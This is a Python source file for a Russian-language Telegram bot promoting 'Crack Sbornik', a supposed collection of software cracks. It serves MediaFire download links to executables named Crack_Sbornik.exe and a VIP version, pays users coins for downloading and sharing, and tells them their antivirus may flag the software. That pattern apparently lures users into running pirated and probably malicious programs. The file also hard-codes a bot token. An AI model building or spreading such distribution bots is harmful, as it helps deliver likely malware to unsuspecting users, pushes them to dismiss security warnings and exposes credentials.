import os
import time
from flask import Flask, request
import telebot
from telebot import types

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"
ADMIN_ID = 7859226148

SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
VIP_LINK = "https://www.mediafire.com/file/fh6v3l9v27jh4g7/Crack_Sbornik_VIP.exe/file"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Данные
users = set()
user_last_use = {}
coins_data = {}
message_tracker = {}
blacklist = set()
waiting_for_report = {}
download_count = 0

# Файлы
COINS_FILE = "coins.txt"
MESSAGES_FILE = "messages.txt"
BLACKLIST_FILE = "blacklist.txt"

def save_coins():
    with open(COINS_FILE, 'w') as f:
        for uid, coins in coins_data.items():
            f.write(f"{uid}|{coins}\n")

def load_coins():
    global coins_data
    if os.path.exists(COINS_FILE):
        with open(COINS_FILE, 'r') as f:
            for line in f:
                if '|' in line:
                    uid, coins = line.strip().split('|')
                    coins_data[int(uid)] = int(coins)

def save_messages():
    with open(MESSAGES_FILE, 'w') as f:
        for uid, data in message_tracker.items():
            f.write(f"{uid}|{data['count']}|{data['name']}\n")

def load_messages():
    global message_tracker
    if os.path.exists(MESSAGES_FILE):
        with open(MESSAGES_FILE, 'r') as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split('|')
                    if len(parts) == 3:
                        message_tracker[int(parts[0])] = {"count": int(parts[1]), "name": parts[2]}

def save_blacklist():
    with open(BLACKLIST_FILE, 'w') as f:
        for uid in blacklist:
            f.write(f"{uid}\n")

def load_blacklist():
    global blacklist
    if os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'r') as f:
            blacklist = set(int(l.strip()) for l in f if l.strip())

def get_coins(uid):
    return coins_data.get(uid, 0)

def add_coins(uid, amount):
    coins_data[uid] = coins_data.get(uid, 0) + amount
    save_coins()

def remove_coins(uid, amount):
    if coins_data.get(uid, 0) >= amount:
        coins_data[uid] = coins_data.get(uid, 0) - amount
        save_coins()
        return True
    return False

def get_messages(uid):
    return message_tracker.get(uid, {}).get("count", 0)

def add_message(uid, name):
    if uid in message_tracker:
        message_tracker[uid]["count"] += 1
    else:
        message_tracker[uid] = {"count": 1, "name": name}
    save_messages()

def is_banned(uid):
    return uid in blacklist

def is_admin(uid):
    return uid == ADMIN_ID

def check_cd(uid):
    now = time.time()
    if uid in user_last_use:
        if now - user_last_use[uid] < 5:
            return int(5 - (now - user_last_use[uid]))
    return 0

def update_cd(uid):
    user_last_use[uid] = time.time()

# =============== КОМАНДЫ ===============
@bot.message_handler(commands=['start'])
def start_command(message):
    uid = message.from_user.id
    if is_banned(uid):
        bot.send_message(uid, "❌ Вы забанены!")
        return
    
    users.add(uid)
    add_message(uid, message.from_user.first_name)
    
    if get_coins(uid) == 0:
        add_coins(uid, 100)
        bot.send_message(uid, "🎁 +100 монет за регистрацию!")
    
    cd = check_cd(uid)
    if cd > 0:
        bot.send_message(uid, f"⏳ Подожди {cd} сек!")
        return
    update_cd(uid)
    
    kb = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    btn2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    btn3 = types.InlineKeyboardButton("👥 Поделиться", callback_data="share")
    btn4 = types.InlineKeyboardButton("📢 Репорт", callback_data="report")
    btn5 = types.InlineKeyboardButton("🌐 Статистика", callback_data="stats")
    btn6 = types.InlineKeyboardButton("🔝 VIP КРЯКИ", callback_data="vip")
    kb.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    bot.send_message(uid, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=kb)

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Нет доступа!")
        return
    
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users"),
        types.InlineKeyboardButton("💰 Монеты", callback_data="admin_coins")
    )
    bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=kb)

@bot.message_handler(commands=['cancel'])
def cancel_command(message):
    uid = message.from_user.id
    if uid in waiting_for_report:
        del waiting_for_report[uid]
        bot.send_message(uid, "❌ Жалоба отменена")

# =============== КНОПКИ ПОЛЬЗОВАТЕЛЯ ===============
@bot.callback_query_handler(func=lambda call: call.data == "stats")
def stats_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    bot.answer_callback_query(call.id)
    
    text = f"📊 **Статистика**\n\n"
    text += f"💰 Монеты: {get_coins(uid)}\n"
    text += f"💬 Сообщений: {get_messages(uid)}\n"
    text += f"🆔 ID: {uid}\n"
    text += f"👤 Имя: {call.from_user.first_name}\n"
    bot.send_message(uid, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "vip")
def vip_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    
    if get_coins(uid) < 1250:
        bot.answer_callback_query(call.id, f"❌ Нужно 1250 монет! У вас {get_coins(uid)}", True)
        return
    
    remove_coins(uid, 1250)
    bot.answer_callback_query(call.id, "✅ Снято 1250 монет!", False)
    bot.send_message(uid, f"🔝 VIP КРЯКИ\n\n🔗 {VIP_LINK}\n💰 Остаток: {get_coins(uid)}")

@bot.callback_query_handler(func=lambda call: call.data == "download")
def download_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    
    global download_count
    download_count += 1
    add_coins(uid, 10)
    bot.answer_callback_query(call.id, "✅ +10 монет!", False)
    bot.send_message(uid, f"🔗 {SOFT_LINK}")

@bot.callback_query_handler(func=lambda call: call.data == "more")
def more_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    
    bot.answer_callback_query(call.id, "📸", False)
    bot.send_photo(uid, IMAGE_URL, caption="☢️ антивирус может ругаться на софт")

@bot.callback_query_handler(func=lambda call: call.data == "share")
def share_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    bot.answer_callback_query(call.id)
    bot.send_message(uid, f"👥 Поделиться:\nhttps://t.me/{bot.get_me().username}")

@bot.callback_query_handler(func=lambda call: call.data == "report")
def report_callback(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return
    
    cd = check_cd(uid)
    if cd > 0:
        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
        return
    update_cd(uid)
    
    bot.answer_callback_query(call.id)
    waiting_for_report[uid] = True
    bot.send_message(uid, "✍️ Напишите текст жалобы\n(/cancel для отмены)")

# =============== ОБРАБОТКА ЖАЛОБ ===============
@bot.message_handler(func=lambda m: m.from_user.id in waiting_for_report)
def handle_report_text(m):
    uid = m.from_user.id
    text = m.text.strip()
    if uid in waiting_for_report:
        del waiting_for_report[uid]
    
    add_message(uid, m.from_user.first_name)
    add_coins(uid, 50)
    bot.send_message(uid, "✅ Жалоба отправлена! +50 монет")
    bot.send_message(ADMIN_ID, f"📢 ЖАЛОБА от {m.from_user.first_name} (ID: {uid})\n\n{text}")

# =============== АДМИН-КНОПКИ ===============
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
        return
    bot.answer_callback_query(call.id)
    
    if call.data == "admin_stats":
        bot.send_message(call.message.chat.id, f"📊 Статистика:\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
    
    elif call.data == "admin_users":
        bot.send_message(call.message.chat.id, f"👥 Всего пользователей: {len(users)}")
    
    elif call.data == "admin_coins":
        bot.send_message(call.message.chat.id, f"💰 Всего монет выдано: {sum(coins_data.values())}")

# =============== ЗАПУСК ===============
load_coins()
load_messages()
load_blacklist()

print("✅ Бот запускается...")
print(f"👥 Загружено пользователей: {len(message_tracker)}")
print(f"💰 Загружено монет: {len(coins_data)}")

@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def index():
    return "Bot is running!"

if __name__ == "__main__":
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=f"https://bot-tg-1-x4tg.onrender.com/{TOKEN}")
    print("✅ Webhook установлен")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
